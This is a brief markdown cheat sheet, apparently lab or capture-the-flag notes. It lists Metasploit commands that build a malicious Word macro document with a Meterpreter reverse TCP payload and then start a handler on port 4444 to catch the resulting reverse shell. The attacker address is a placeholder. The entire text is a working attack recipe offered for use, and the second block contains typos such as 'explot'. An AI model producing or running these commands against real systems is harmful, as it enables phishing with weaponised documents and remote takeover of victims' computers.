## Create Macro Exploit

```sh
msfconsole
set payload windows/meterpreter/reverse_tcp
use exploit/multi/fileformat/office_word_macro
set LHOST CONNECTION_IP
set LPORT 4444
show options
exploit
```

## Listen reverse shell
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST CONNECTION_IP
SET LPORT 4444
show options
explot
```
